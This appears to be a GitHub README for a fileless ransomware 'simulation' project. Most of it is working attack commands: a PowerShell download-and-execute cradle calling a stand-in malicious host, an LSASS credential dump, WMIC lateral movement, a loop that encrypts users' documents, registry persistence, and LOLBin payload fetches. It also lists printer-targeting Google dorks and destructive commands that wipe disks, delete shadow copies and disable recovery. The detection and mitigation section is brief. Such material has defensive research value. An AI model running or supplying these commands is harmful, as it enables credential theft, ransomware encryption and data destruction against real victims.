

# ⚠️ NSFW-Ransomware: Fileless Ransomware Simulation & Detection Framework (PoC)

> **⚠️ Educational Use Only**
> This project is strictly intended for **authorized research**, **detection engineering**, and **security education** in **isolated lab environments**.
> **Do not deploy in production environments or on unauthorized systems.**
> The authors **assume no liability** for misuse or damage caused.

---

![NSFW-Ransomware Simulation](https://github.com/user-attachments/assets/0a7b0119-2b11-49f1-93af-4fae2e6517bc)

---

## 📚 Table of Contents

* [Overview](#overview)
* [Features](#features)
* [Attack Chain Overview](#attack-chain-overview)
* [Getting Started](#getting-started)
* [Attack Simulation (PowerShell)](#attack-simulation-powershell)
* [Reconnaissance & LOLBins](#reconnaissance--lolbins)
* [Advanced Tradecraft](#advanced-tradecraft)
* [ATT\&CK Framework Mapping](#attack-framework-mapping)
* [Destructive Payload Scenarios](#destructive-payload-scenarios)
* [Detection & Mitigation](#detection--mitigation)
* [Legal Notice](#legal-notice)
* [References](#references)

---

## 🔍 Overview

**NSFW-Ransomware** is a fileless ransomware simulation project designed to emulate stealthy, advanced threat actor behaviors using native Windows binaries (LOLBins), reflective DLL injection, and memory-resident payloads. It provides an end-to-end lab scenario for blue teams to test and improve threat detection capabilities.

### Objectives

* Provide a realistic simulation of fileless ransomware behavior.
* Equip detection engineers and red teamers with modular testing components.
* Demonstrate abuse of trusted Windows binaries (LOLBins) for stealth execution.

---

## 🧩 Features

* **100% Fileless Operation**: Executes all payloads in-memory without writing binaries to disk.
* **LOLBins-Only Execution**: Uses Windows-native binaries (PowerShell, rundll32, certutil, etc.).
* **Privilege Escalation & Credential Dumping**: Demonstrates Print Spooler and HiveNightmare abuse.
* **Lateral Movement**: Simulates spread via network shares using legitimate tools.
* **Ransomware Simulation**: Encrypts user documents and disables recovery options.
* **Modular Structure**: Easily adapted for training, detection testing, or C2 simulation.
* **Threat Mapping**: Fully aligned with MITRE ATT\&CK TTPs.

---

## 🧠 Attack Chain Overview

This simulation mimics the lifecycle of a modern, stealthy ransomware operation:

1. **Initial Access** – Load payload in memory via trusted LOLBins.
2. **Privilege Escalation** – Exploit known local vulnerabilities.
3. **Credential Dumping** – Extract secrets using trusted binaries.
4. **Lateral Movement** – Move across hosts via SMB/WinRM.
5. **Impact** – Encrypt/wipe files, disable recovery mechanisms.
6. **Persistence** – Fileless registry-based PowerShell startup.

---

## ⚙️ Getting Started

### ✅ Prerequisites

* Windows 10 or 11 (Virtual Machine, snapshot-enabled)
* PowerShell 5+
* Administrative privileges
* Internet access (optional for payload fetch)
* Tools: [7-Zip](https://www.7-zip.org/), Sysinternals, Sigma rules

### 🛠️ Build/Run Instructions

* No compilation required (PowerShell + native Windows binaries)
* Execution examples provided below—adjust for isolated testing environments only

---

## 🔧 Attack Simulation (PowerShell)

```powershell
# 1. Initial Access - Memory-only dropper
IEX(New-Object Net.WebClient).DownloadString("http://malicious.local/dropper.ps1")

# 2. In-Memory Payload Loading
$bytes = [System.Convert]::FromBase64String("[BASE64_PAYLOAD]")
[System.Reflection.Assembly]::Load($bytes)

# 3. Privilege Escalation - Run with elevated token
Start-Process powershell -Args "-File C:\Temp\elevate.ps1" -Verb RunAs

# 4. Credential Access - LSASS dump
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full

# 5. Lateral Movement - WMIC payload delivery
wmic /node:TARGET_PC process call create "powershell.exe -File \\network_share\payload.ps1"

# 6. File Encryption Simulation
$files = Get-ChildItem -Path "C:\Users\*\Documents" -Include *.docx,*.pdf -Recurse
foreach ($file in $files) {
  $data = Get-Content $file.FullName -Raw
  $aes = New-Object System.Security.Cryptography.AesManaged
  $aes.Key = [Text.Encoding]::UTF8.GetBytes("RANDOM-GEN-KEY-1234567890123456")
  $aes.IV = New-Object byte[] 16
  $enc = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($data), 0, $data.Length)
  Set-Content -Path $file.FullName -Value ([Convert]::ToBase64String($enc))
}

# 7. Persistence - Fileless
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ransomware" -Value "powershell -File C:\Temp\persist.ps1"
```

---

## 🛰️ Reconnaissance & LOLBins

### 🔍 Google Dorking Targets

```text
inurl:"/hp/device/this.LCDispatcher"
intitle:"Web Image Monitor"
inurl:"/printers/"
intitle:"Konica Minolta"
inurl:"/printer/main.html"
intitle:"PaperCut MF"
```

### 🛠️ Living Off the Land Binaries (LOLBins)

```cmd
rundll32.exe \\192.168.X.X\share\payload.dll,ReflectEntry
regsvr32.exe /s /n /u /i:http://malicious.local/script.sct scrobj.dll
certutil.exe -urlcache -split -f http://malicious.local/dropper.b64 drop.b64
```

---

## 🧪 Advanced Tradecraft

### 🎭 Fileless Dropper via Stego-Container

```cmd
copy /b clean.jpg + encrypted.7z clean.jpg
certutil -decode clean.jpg payload.7z
7z x payload.7z -oC:\Temp
```

### 💉 Reflective DLL Injection

```cmd
rundll32.exe \\attacker\payload.dll,ReflectEntry
```

This method bypasses disk-based forensics and many traditional antivirus engines.

---

## 🧬 ATT\&CK Framework Mapping

| Phase                | Technique                             | ID               | Summary Description                      |
| -------------------- | ------------------------------------- | ---------------- | ---------------------------------------- |
| Initial Access       | Valid Accounts, Drive-by Compromise   | T1078, T1189     | Compromised print interfaces or accounts |
| Execution            | LOLBins, Reflective Injection         | T1218, T1055.001 | Memory execution without binaries        |
| Privilege Escalation | Print Spooler Exploits, HiveNightmare | T1068, T1003.002 | SYSTEM access escalation                 |
| Defense Evasion      | Encoded Commands, Fileless Execution  | T1027, T1202     | Avoid disk IOCs, evade EDRs              |
| Credential Access    | LSASS Dumping                         | T1003            | Extract plaintext and hashes             |
| Lateral Movement     | SMB, Remote Scripting                 | T1021.002        | Spread via shares and WinRM              |
| Impact               | Encryption, Data Destruction          | T1485, T1486     | Encrypts files, disables recovery        |

---

## 💥 Destructive Payload Scenarios (LOLBins)

```cmd
cipher /w:C:                                   # Disk wipe via native cipher tool
vssadmin delete shadows /all /quiet            # Remove shadow copies
wbadmin delete systemstatebackup -keepVersions:0
bcdedit /set {default} recoveryenabled No      # Disable recovery options
fsutil dirty set C:                            # Force dirty volume
forfiles /p C:\ /s /d -2 /c "cmd /c del /q @file"
schtasks /create /tn "Wipe" /tr "cmd /c del /f /q C:\*.xls" /sc once /st 23:59
```

---

## 🛡️ Detection & Mitigation

### 🔍 Detection

* **Sysmon + Sigma Rules**:

  * Detect suspicious LOLBin usage
  * Monitor registry changes for fileless persistence
  * Track PowerShell obfuscation and base64 decoding

* **SIEM Correlation (Splunk/ELK)**:

  * Alert on lateral execution from network shares
  * Flag parent-child anomalies (e.g., `explorer.exe -> rundll32.exe`)

* **EDR/XDR Solutions**:

  * Watch for in-memory execution patterns
  * Reflective injection detection heuristics

### 🛡️ Mitigation

```powershell
# Disable Print Spooler
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled

# Block LOLBins (WDAC/AppLocker Recommended)
# Patch vulnerable services (HiveNightmare, Print Spooler)

# Restrict access to administrative shares
# Enforce segmentation, strict firewall policies

# Maintain frequent, offline, immutable backups
```

---

## ⚖️ Legal Notice

> All materials in this repository are provided **strictly for educational and authorized research use**.
> Any **unauthorized deployment, testing, or distribution** of this content is **strictly prohibited**.
> **Use at your own risk. The authors bear no liability for misuse.**

---

## 📚 References

* [LOLOL.farm – LOLBin Playground](https://lolol.farm/)
* [PrintNightmare Post-Mortem](https://itm4n.github.io/printnightmare-not-over/)
* [HiveNightmare Analysis](https://github.com/GossiTheDog/HiveNightmare)
* [Sigma Rule Repos](https://github.com/SigmaHQ/sigma)
* [DLL Injection Primer – Crow Security](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)
* [Fileless Malware – Wikipedia](https://en.wikipedia.org/wiki/Fileless_malware)
* [MITRE ATT\&CK: T1055.001](https://attack.mitre.org/techniques/T1055/001/)

---

> **🔐 Think like a threat actor. Defend like a fortress. Train responsibly.**

